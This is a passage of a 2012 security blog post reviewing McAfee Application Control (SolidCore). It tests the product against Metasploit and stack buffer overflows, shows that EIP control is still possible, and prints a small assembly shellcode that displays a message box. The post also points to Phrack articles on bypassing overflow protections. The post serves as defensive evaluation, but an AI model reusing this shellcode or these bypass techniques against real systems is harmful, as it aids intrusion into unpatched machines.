<div id="attachment_1434" style="width: 590px" class="wp-caption aligncenter"><a href="../../../wp-content/uploads/2012/12/McAfee_Solicore-Registry.png" rel="lightbox[1394]"><img class="size-medium wp-image-1434" title="McAfee_Solicore-Registry" alt="McAfee SolidCore AppInit_DLLs" src="../../../wp-content/uploads/2012/12/McAfee_Solicore-Registry-580x297.png" width="580" height="297" srcset="/wp-content/uploads/2012/12/McAfee_Solicore-Registry-580x297.png 580w, /wp-content/uploads/2012/12/McAfee_Solicore-Registry-500x256.png 500w, /wp-content/uploads/2012/12/McAfee_Solicore-Registry.png 753w" sizes="(max-width: 580px) 100vw, 580px" /></a><p class="wp-caption-text">McAfee SolidCore does not use AppInit_DLLs</p></div>
<p>Nothing there, so it must be done through a hook.</p>
<h1>First tests: Metasploit</h1>
<p>I was told that SolidCore was doing good against Metasploit, so one of the first thing I did was to fire up Backtrack and play with it against the SP1 &#8220;solidified&#8221; target.</p>
<p>And I have to say that I was quickly disapointed.</p>
<p>Sure, I could not get a Meterpreter session or get a standard payload to work out of the box, whereas it was a piece of cake on the standard SP1.</p>
<div id="attachment_1437" style="width: 590px" class="wp-caption aligncenter"><a href="../../../wp-content/uploads/2012/12/McAfee_SolidCore-Payload_fails.png" rel="lightbox[1394]"><img class="size-medium wp-image-1437" title="McAfee_SolidCore-Payload_fails" alt="SolidCore and payload failure" src="../../../wp-content/uploads/2012/12/McAfee_SolidCore-Payload_fails-580x175.png" width="580" height="175" srcset="/wp-content/uploads/2012/12/McAfee_SolidCore-Payload_fails-580x175.png 580w, /wp-content/uploads/2012/12/McAfee_SolidCore-Payload_fails-940x285.png 940w, /wp-content/uploads/2012/12/McAfee_SolidCore-Payload_fails-500x151.png 500w, /wp-content/uploads/2012/12/McAfee_SolidCore-Payload_fails.png 1009w" sizes="(max-width: 580px) 100vw, 580px" /></a><p class="wp-caption-text">SolidCore prevents standard Metasploit payloads (including Meterpreter) to run successfully.</p></div>
<p>But if SolidCore was at least disturbing the exploitation, it did not protect at all against the vulnerability itself. So I got things like this:</p>
<div id="attachment_1435" style="width: 590px" class="wp-caption aligncenter"><a href="../../../wp-content/uploads/2012/12/McAfee_SolidCore-Metasploit_DoS.png" rel="lightbox[1394]"><img class="size-medium wp-image-1435" title="McAfee_SolidCore-Metasploit_DoS" alt="SolidCore and Metasploit DoS" src="../../../wp-content/uploads/2012/12/McAfee_SolidCore-Metasploit_DoS-580x433.png" width="580" height="433" srcset="/wp-content/uploads/2012/12/McAfee_SolidCore-Metasploit_DoS-580x433.png 580w, /wp-content/uploads/2012/12/McAfee_SolidCore-Metasploit_DoS-401x300.png 401w, /wp-content/uploads/2012/12/McAfee_SolidCore-Metasploit_DoS.png 801w" sizes="(max-width: 580px) 100vw, 580px" /></a><p class="wp-caption-text">Denial of Service during exploitation attempt with Metasploit: SolidCore will not magically &#8220;patch&#8221; vulnerabilities!</p></div>
<p>A good old denial of service. Note that on the event log, SolidCore itself doesn&#8217;t log the exploitation attempt.</p>
<p>I did several tests and depending on the vulnerability I got:</p>
<ul>
<li>service crash</li>
<li>system instability</li>
<li>complete DoS (system shutdown)</li>
</ul>
<div>So if a script skiddie will not be able to control the target, he will still obviously be able to cause a lot of damage!</div>
<p>It was not really a surprise: McAfee will not patch the system! But think twice when you are said the contrary&#8230;</p>
<h1>More tests, about memory protection: buffer overflows</h1>
<p>As I was also told that McAfee was protecting user-mode apps against buffer overflows, I was even more excited.</p>
<p>I prepared various representative tests:</p>
<ul>
<li>heap overflow, based on Aurora</li>
<li>stack overflows (one base on strcpy, the other one on Windows CreateFile)</li>
</ul>
<p>But first, one thing I wanted to quickly eliminate was the memory randomization feature, named <strong>mp-vasr</strong>:</p>
<div id="attachment_1439" style="width: 594px" class="wp-caption aligncenter"><a href="../../../wp-content/uploads/2012/12/SolidCore_mp-vasr.png" rel="lightbox[1394]"><img class="size-large wp-image-1439" title="SolidCore_mp-vasr" alt="SolidCore mp-vasr" src="../../../wp-content/uploads/2012/12/SolidCore_mp-vasr-940x587.png" width="584" height="364" srcset="/wp-content/uploads/2012/12/SolidCore_mp-vasr-940x587.png 940w, /wp-content/uploads/2012/12/SolidCore_mp-vasr-580x362.png 580w, /wp-content/uploads/2012/12/SolidCore_mp-vasr-480x300.png 480w, /wp-content/uploads/2012/12/SolidCore_mp-vasr.png 1280w" sizes="(max-width: 584px) 100vw, 584px" /></a><p class="wp-caption-text">SolidCore mp-vasr IS NOT ALSR</p></div>
<p><strong>mp-vasr is not ALSR!</strong> The function gets always loaded at the same memory address, so there is not process memory randomization at all&#8230; Another disappointment&#8230;</p>
<p>Next step was to try to exploit the stack overflow. The first payload I used displays a message box. It calls LoadLibrary and GetProcAddress to dynamically resolve function addresses.</p>
<p>When we try to exploit the buffer overflow, we get this:</p>
<div id="attachment_1444" style="width: 590px" class="wp-caption aligncenter"><a href="../../../wp-content/uploads/2012/12/McAfee_SolidCore-Shellcode11.png" rel="lightbox[1394]"><img class="size-medium wp-image-1444" title="McAfee_SolidCore-Shellcode1" alt="SolidCore blocking a shellcode" src="../../../wp-content/uploads/2012/12/McAfee_SolidCore-Shellcode11-580x405.png" width="580" height="405" srcset="/wp-content/uploads/2012/12/McAfee_SolidCore-Shellcode11-580x405.png 580w, /wp-content/uploads/2012/12/McAfee_SolidCore-Shellcode11-429x300.png 429w, /wp-content/uploads/2012/12/McAfee_SolidCore-Shellcode11.png 668w" sizes="(max-width: 580px) 100vw, 580px" /></a><p class="wp-caption-text">SolidCore causes memory access violation during shellcode injection</p></div>
<p>We have a memory access violation, because the code is trying the access to the address NULL. Weird, let&#8217;s see it with OllyDbg.</p>
<p>First, there is something that looks like a hook in ntdll:</p>
<div id="attachment_1446" style="width: 556px" class="wp-caption aligncenter"><a href="../../../wp-content/uploads/2012/12/SolidCore-PE.png" rel="lightbox[1394]"><img class="size-full wp-image-1446" title="SolidCore-PE" alt="SolidCore checking against PE signature" src="../../../wp-content/uploads/2012/12/SolidCore-PE.png" width="546" height="171" srcset="/wp-content/uploads/2012/12/SolidCore-PE.png 546w, /wp-content/uploads/2012/12/SolidCore-PE-500x156.png 500w" sizes="(max-width: 546px) 100vw, 546px" /></a><p class="wp-caption-text">SolidCore checking against PE signature</p></div>
<p>So this thing is checking the code for a PE signature (<em><strong>5A4D</strong></em>). Then, it will go through <em><strong>scinject.dll</strong> </em>(by calling <em><strong>casp_inject_save_addr</strong></em>, wich is the only exported function).</p>
<p>I could not reverse it (which would require much more time and skills than I have now), but at least we know where it is sitting and how it is triggered.</p>
<p>If we continue the execution, we can then see that the buffer overflow is happening very well:</p>
<div id="attachment_1448" style="width: 594px" class="wp-caption aligncenter"><a href="../../../wp-content/uploads/2012/12/SolidCore-bof.png" rel="lightbox[1394]"><img class="size-large wp-image-1448" title="SolidCore-bof" alt="SolidCore and buffer overflow" src="../../../wp-content/uploads/2012/12/SolidCore-bof-940x587.png" width="584" height="364" srcset="/wp-content/uploads/2012/12/SolidCore-bof-940x587.png 940w, /wp-content/uploads/2012/12/SolidCore-bof-580x362.png 580w, /wp-content/uploads/2012/12/SolidCore-bof-480x300.png 480w, /wp-content/uploads/2012/12/SolidCore-bof.png 1280w" sizes="(max-width: 584px) 100vw, 584px" /></a><p class="wp-caption-text">SolidCore does not prevent stack overflow!</p></div>
<p>Yes, we have the stack is fully overflowed and we can control EIP! So nothing should prevent us from exploiting it, shouldn&#8217;t it? ;-)</p>
<p>Here we go:</p>
<p><iframe src="http://player.vimeo.com/video/55797517?badge=0" height="375" width="500" allowfullscreen="" frameborder="0"></iframe></p>
<p>This first payload is low-tech, with hardcoded addresses of <em><strong>MessageBoxA</strong></em> and <strong><em>ExitProcess</em></strong>:</p>
<pre>global _start

_start:

 ;MessageBoxA(windowhandle,msg,title,type)
 mov ebx, 0xEEEEEEEF
 add ebx, 0x11111111 ;\0
 push ebx
 push 0x293a2064 ;d :)
 push 0x656e7770 ;pwne
 mov ecx, esp
 xor edx,edx
 push edx ;OK button
 push ecx ;title
 push ecx ;message
 push edx ;NULL window handle
 mov eax, 0x6a216476 ;MessageBoxA
 call eax
 ;exit
 xor edx,edx ;empty edx out
 push edx ;move address of MessageBoxA onto stack
 mov eax, 0x5cdb98fd ;ExitProcess(exitcode);
 call eax ;exit cleanly so we don't crash parent</pre>
<p>Let&#8217;s how it looks in OllyDbg:</p>
<div id="attachment_1452" style="width: 594px" class="wp-caption alignnone"><a href="../../../2012/12/14/review-of-mcafee-application-control-ex-solidcore-the-ultimate-solution-to-patching.html/solidcore-buffer_overflow_exploitation.html" rel="attachment wp-att-1452"><img class="size-large wp-image-1452" alt="Buffer overflow exploitation despite McAfee Application Control" src="../../../wp-content/uploads/2012/12/SolidCore-Buffer_overflow_exploitation-940x564.png" width="584" height="350" srcset="/wp-content/uploads/2012/12/SolidCore-Buffer_overflow_exploitation-940x564.png 940w, /wp-content/uploads/2012/12/SolidCore-Buffer_overflow_exploitation-580x348.png 580w, /wp-content/uploads/2012/12/SolidCore-Buffer_overflow_exploitation-500x300.png 500w, /wp-content/uploads/2012/12/SolidCore-Buffer_overflow_exploitation.png 1047w" sizes="(max-width: 584px) 100vw, 584px" /></a><p class="wp-caption-text">Buffer overflow exploitation despite McAfee Application Control</p></div>
<p>I then tested with another more sophisticated shellcode (sorry, I cannot publish this one as I am not the author), which resolves dynamically the addresses of kernel32 and GetProcAddress. It works as well. The only caveat that I observed is that LoadLibraryA is systemically blocked (after going through some scinject.dll routines, it always returns 0 in EAX, wich means failure).</p>
<p>In other words, a simple shellcode will work as long as the necessary library are loaded. Though most real life programs will already come with at least kernel32 and user32, it still gives a lot of opportunities.</p>
<p>And then, with more shellcoding kung-fu, I am sure it is possible to get something even more target independant. The following two articles from Phrack probably give most hints to achieve this:</p>
<ul>
<li><a title="Phrack62: Bypassing third-party Windows Buffer Overflow Protection" href="http://www.phrack.org/issues.html?issue=62&amp;id=5">Phrack62: Bypassing third-party Windows Buffer Overflow Protection</a></li>
<li><a title="Phrack63: NT Shellcodes Prevention demystified" href="http://www.phrack.org/issues.html?issue=63&amp;id=15">Phrack63: NT Shellcodes Prevention demystified</a></li>
</ul>
<p>But I need much more knowledge and practice in shellcoding before I can get something to work. I will see it later, and let me know if you could go ahead yourself.</p>
<h1>Conclusion</h1>
<p>Clearly, McAfee Application Control aka SolidCore is not an efficient protection against buffer overflows. If you want something much better, update your systems to something like Windows 7 64 bits and use Microsoft EMET to force DEP and ALSR on programs that don&#8217;t support it by default.</p>
<p>Also, no way to delay patching because you have SolidCore. Full exploitation (shellcode) is just made a little bit more difficult, and that&#8217;s it. The systems will still be exposed to many risks like denial of service unless they are patched. Like always, defense in depth and a proper security policy are the foundations to decide on the patching policy, not a tool or a feature.</p>
<p>This is a pity that the marketing teams give the wrong message, because McAfee still surely addresses many use cases. It is surely efficient enough to improve the control on workstations, that, for some reason, are difficult to control. For example, SolidCore will probably be enough to prevent the average Joe to mess the system. Why not being honest and keeping focus on this feature?</p>
<p>On the other hand, if the McAfee guys want to be as ambitious as they claim,  they will have to move SolidCore to the kernel-mode and enhance the memory protections from there.</p>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
			<i class="icon-folder-open-empty"></i> <a href="../defense.html" rel="category tag">Defense</a>, <a href="../reversing.html" rel="category tag">Reversing</a>, <a href="../../security.html" rel="category tag">Security</a>, <a href="../vulnerabilities.html" rel="category tag">Vulnerabilities</a> <i class="icon-tag"></i> <a href="../../../tag/application-control.html" rel="tag">Application Control</a>, <a href="../../../tag/asm.html" rel="tag">asm</a>, <a href="../../../tag/assembly.html" rel="tag">Assembly</a>, <a href="../../../tag/backtrack.html" rel="tag">backtrack</a>, <a href="../../../tag/buffer-overflow.html" rel="tag">buffer overflow</a>, <a href="../../../tag/hardening.html" rel="tag">hardening</a>, <a href="../../../tag/heap.html" rel="tag">heap</a>, <a href="../../../tag/mcafee.html" rel="tag">McAfee</a>, <a href="../../../tag/metasploit.html" rel="tag">Metasploit</a>, <a href="../../../tag/ollydbg.html" rel="tag">ollyDbg</a>, <a href="../../../tag/sha-1.html" rel="tag">SHA-1</a>, <a href="../../../tag/solidcore.html" rel="tag">SolidCore</a>, <a href="../../../tag/stack.html" rel="tag">stack</a>, <a href="../../../tag/windbg.html" rel="tag">WinDBG</a> <i class="icon-calendar"></i> <a href="../../../2012/12/14/review-of-mcafee-application-control-ex-solidcore-the-ultimate-solution-to-patching.html" title="6:55 pm" rel="bookmark"><time class="entry-date" datetime="2012-12-14T18:55:18+00:00">December 14, 2012</time></a><span class="by-author"> by <span class="author vcard"><a class="url fn n" href="../../../author/jc.html" title="View all posts by phocean" rel="author">phocean</a></span></span>.								</footer><!-- .entry-meta -->
	</article><!-- #post -->			<nav id="nav-below" class="navigation" role="navigation">
				<h3 class="assistive-text">Post navigation</h3>
				<div class="nav-previous"><a href="5.html" ><span class="meta-nav">&larr;</span> Older posts</a></div>
				<div class="nav-next"><a href="3.html" >Newer posts <span class="meta-nav">&rarr;</span></a></div>
			</nav><!-- .navigation -->
			
		
		</div><!-- #content -->
	</section><!-- #primary -->


		</div><!-- #main .wrapper -->
	<footer id="colophon" role="contentinfo">
		<div class="site-info">
									<a href="https://wordpress.org/" class="imprint" title="Semantic Personal Publishing Platform">
				Proudly powered by WordPress			</a>
		</div><!-- .site-info -->
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript'>
/* <![CDATA[ */
var JQLBSettings = {"fitToScreen":"1","resizeSpeed":"400","displayDownloadLink":"0","navbarOnTop":"0","loopImages":"","resizeCenter":"","marginSize":"5","linkTarget":"_self","help":"","prevLinkTitle":"previous image","nextLinkTitle":"next image","prevLinkText":"\u00ab Previous","nextLinkText":"Next \u00bb","closeTitle":"close image gallery","image":"Image ","of":" of ","download":"Download","jqlb_overlay_opacity":"80","jqlb_overlay_color":"#000000","jqlb_overlay_close":"1","jqlb_border_width":"10","jqlb_border_color":"#ffffff","jqlb_border_radius":"0","jqlb_image_info_background_transparency":"100","jqlb_image_info_bg_color":"#ffffff","jqlb_image_info_text_color":"#000000","jqlb_image_info_text_fontsize":"10","jqlb_show_text_for_image":"1","jqlb_next_image_title":"next image","jqlb_previous_image_title":"previous image","jqlb_next_button_image":"https:\/\/phocean.net\/wp-content\/plugins\/wp-lightbox-2\/styles\/images\/next.gif","jqlb_previous_button_image":"https:\/\/phocean.net\/wp-content\/plugins\/wp-lightbox-2\/styles\/images\/prev.gif","jqlb_maximum_width":"","jqlb_maximum_height":"","jqlb_show_close_button":"1","jqlb_close_image_title":"close image gallery","jqlb_close_image_max_heght":"22","jqlb_image_for_close_lightbox":"https:\/\/phocean.net\/wp-content\/plugins\/wp-lightbox-2\/styles\/images\/closelabel.gif","jqlb_keyboard_navigation":"1","jqlb_popup_size_fix":"0"};
var JQLBSettings = {"fitToScreen":"1","resizeSpeed":"400","displayDownloadLink":"0","navbarOnTop":"0","loopImages":"","resizeCenter":"","marginSize":"5","linkTarget":"_self","help":"","prevLinkTitle":"previous image","nextLinkTitle":"next image","prevLinkText":"\u00ab Previous","nextLinkText":"Next \u00bb","closeTitle":"close image gallery","image":"Image ","of":" of ","download":"Download","jqlb_overlay_opacity":"80","jqlb_overlay_color":"#000000","jqlb_overlay_close":"1","jqlb_border_width":"10","jqlb_border_color":"#ffffff","jqlb_border_radius":"0","jqlb_image_info_background_transparency":"100","jqlb_image_info_bg_color":"#ffffff","jqlb_image_info_text_color":"#000000","jqlb_image_info_text_fontsize":"10","jqlb_show_text_for_image":"1","jqlb_next_image_title":"next image","jqlb_previous_image_title":"previous image","jqlb_next_button_image":"https:\/\/phocean.net\/wp-content\/plugins\/wp-lightbox-2\/styles\/images\/next.gif","jqlb_previous_button_image":"https:\/\/phocean.net\/wp-content\/plugins\/wp-lightbox-2\/styles\/images\/prev.gif","jqlb_maximum_width":"","jqlb_maximum_height":"","jqlb_show_close_button":"1","jqlb_close_image_title":"close image gallery","jqlb_close_image_max_heght":"22","jqlb_image_for_close_lightbox":"https:\/\/phocean.net\/wp-content\/plugins\/wp-lightbox-2\/styles\/images\/closelabel.gif","jqlb_keyboard_navigation":"1","jqlb_popup_size_fix":"0"};
/* ]]> */
</script>
<script type='text/javascript' src='/wp-content/plugins/wp-lightbox-2/wp-lightbox-2.min.js'></script>
<script type='text/javascript' src='/wp-content/themes/twentytwelve/js/navigation.js'></script>
<script type='text/javascript' src='/wp-includes/js/wp-embed.min.js'></script>
<!-- Generated in 1.774 seconds. Made 18 queries to database and 45 cached queries. Memory used - 28MB -->
<!-- Cached by DB Cache Reloaded Fix -->
</body>

<!-- Mirrored from phocean.net/category/security/page/4 by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 26 May 2019 07:57:27 GMT -->
<!-- Mirrored from phocean.net/category/security/page/4 by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 26 May 2019 07:57:27 GMT -->
</html>

<!-- Dynamic page generated in 1.738 seconds. -->